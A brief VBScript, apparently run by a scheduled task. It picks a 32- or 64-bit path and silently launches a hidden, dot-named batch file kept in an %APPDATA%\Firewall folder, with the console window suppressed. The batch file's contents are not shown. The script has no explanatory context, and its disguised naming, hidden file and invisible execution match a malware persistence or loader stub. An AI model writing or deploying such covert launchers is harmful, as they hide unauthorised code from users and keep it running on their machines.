' running with task

Set objShell = CreateObject("WScript.Shell")

If InStr(LCase(objShell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")), "64") > 0 Then
    osBit = "64"
Else
    osBit = "32"
End If

filePath = objShell.ExpandEnvironmentStrings("%APPDATA%\Firewall" & osBit & "\.firewall" & osBit & ".bat")

objShell.Run "cmd /c " & filePath, 0, False
